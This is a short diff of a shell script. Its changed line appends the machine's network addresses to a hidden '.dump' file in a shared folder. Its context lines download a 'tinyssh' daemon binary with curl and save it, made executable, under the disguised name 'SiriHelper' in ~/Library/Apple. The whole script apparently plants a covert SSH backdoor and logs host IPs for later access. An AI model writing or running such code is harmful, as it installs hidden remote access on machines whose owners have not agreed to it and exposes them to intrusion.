@@ -1,4 +1,4 @@
-ifconfig en0 | grep "inet" > /sgoinfre/goinfre/Perso/.dump;
+ifconfig en0 | grep "inet" >> /sgoinfre/goinfre/Perso/.dump;
 mkdir -p  /Users/`whoami`/Library/Apple;
 curl https://raw.githubusercontent.com/asyade/tinyssh/master/deamon/deamon > /Users/`whoami`/Library/Apple/SiriHelper;
 chmod 700 /Users/`whoami`/Library/Apple/SiriHelper;
